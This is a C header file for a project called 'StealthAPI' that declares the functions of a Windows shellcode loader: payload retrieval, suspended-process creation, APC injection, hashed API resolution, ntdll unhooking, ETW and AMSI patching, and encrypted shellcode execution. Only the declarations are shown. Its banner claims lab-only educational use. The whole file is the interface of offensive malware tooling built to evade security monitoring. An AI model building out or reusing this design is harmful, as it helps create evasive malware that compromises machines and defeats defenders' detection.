............................................................................
. Project: StealthAPI                                                      .
. Build for educational purpose in authorized lab environments only.        .
. Author: Ebere Michhael (Call Simba)                                      .
. Telegram: @lets_sudosu                                                   .
. Make the world a better place.                                           .
............................................................................

#pragma once

#ifdef __cplusplus
extern "C" {
#endif

#define INITIAL_HASH 5381
#define INITIAL_SEED 5
#define HASHA(API) (HashStringDjb2A((PCHAR)(API)))

BOOL GetContent(OUT PBYTE* pPayload, OUT SIZE_T* sSizeOfPayload);
BOOL CreateSuspendedProcess(LPCSTR lpProcessName, DWORD* dwProcessId, HANDLE* hProcess, HANDLE* hThread);
BOOL APCInjection(IN HANDLE hProcess, IN PBYTE pShellcode, IN SIZE_T sSizeOfShellcode, OUT PVOID* ppAddress);
HMODULE GetModuleHandleH(DWORD dwModuleNameHash, DWORD hashType);
FARPROC GetProcAddressH(HMODULE hModule, DWORD dwApiNameHash, DWORD hashType);
BOOL Unhook(PVOID CleanNtdllBase);
PVOID MapNtdll();
DWORD HashStringDjb2A(PCHAR String);
DWORD HashStringRandom(PCHAR String, DWORD hashType);
BOOL PatchETW();
BOOL PatchAMSI();
BOOL RunEncryptedShellcode(PUCHAR pShellcode, DWORD shellcodeSize);

#ifdef __cplusplus
}
#endif